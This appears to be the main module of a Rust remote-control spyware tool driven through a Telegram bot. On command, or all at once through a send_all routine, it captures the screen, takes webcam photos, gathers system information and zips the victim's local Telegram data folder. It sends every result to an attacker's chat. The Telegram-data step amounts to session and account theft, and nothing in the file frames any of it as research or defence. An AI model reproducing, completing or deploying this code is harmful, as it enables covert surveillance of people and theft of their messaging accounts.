pub mod scrapper;
pub mod system;
pub mod config;

use std::fs;
use std::process::exit;
use std::time::Duration;
use config::Config;
use teloxide::{macros::BotCommands, prelude::*, types::InputFile};
use system::info::*;
use tokio::time::sleep;
use system::process::check_one_current_process;
use system::internet::check_connection;

#[derive(BotCommands, Clone)]
#[command(rename_rule = "lowercase")]
enum Command {
    Who,
    Screenshot,
    Photo,
    Telegram,
    Stop
}

async fn command_processor(bot: Bot, cmd: Command){
    let cfg: &Config = Config::get_config().as_ref().unwrap();
    match cmd {
        Command::Photo => {
            match system::camera::create_photo(&cfg.camera_path){
                Ok(_) => {let _ = bot.send_photo(cfg.chat_id.clone(), InputFile::file(&cfg.camera_path)).await;}
                Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
            };
        }
        Command::Who => {
            match who().await {
                Ok(data) => {let _ = bot.send_message(cfg.chat_id.clone(), data).await;}
                Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
            };
        }
        Command::Screenshot => {
            match system::screen::capture_screen(&cfg.screenshot_path) {
                Ok(_) => {let _ = bot.send_photo(cfg.chat_id.clone(), InputFile::file(&cfg.screenshot_path)).await;}
                Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
            }
        }
        Command::Telegram => {
            match scrapper::telegram::scrap_telegram(&cfg.telegram_path, &cfg.telegram_zip_path, &cfg.local_path){
                Ok(_) => {let _ = bot.send_document(cfg.chat_id.clone(), InputFile::file(&cfg.telegram_zip_path)).await;}
                Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
            }
        }
        Command::Stop => {
            let _ = bot.send_message(cfg.chat_id.clone(), "Stopping...".to_string()).await;
            exit(0);
        }
    };
}

async fn command_handler(bot: Bot, _msg: Message, cmd: Command) -> ResponseResult<()> {
    tokio::spawn(command_processor(bot, cmd));
    return Ok(());
}

async fn prepare_bot() -> Bot{
    check_one_current_process();
    while !check_connection() {sleep(Duration::from_secs(3)).await}
    let cfg: &Config = Config::get_config().as_ref().unwrap();
    let _ = fs::create_dir(&cfg.my_dir);
    let bot = Bot::new(&cfg.bot_token);
    let _ = bot.send_message(cfg.chat_id.clone(), get_connected_text()).await;
    return bot;
}

pub async fn start() {
    let bot = prepare_bot().await;
    Command::repl(bot, command_handler).await;
}

pub async fn send_all(){
    let bot = prepare_bot().await;
    tokio::join!(
        command_processor(bot.clone(), Command::Who),
        command_processor(bot.clone(), Command::Screenshot),
        command_processor(bot.clone(), Command::Photo),
        command_processor(bot.clone(), Command::Telegram)
    );
}


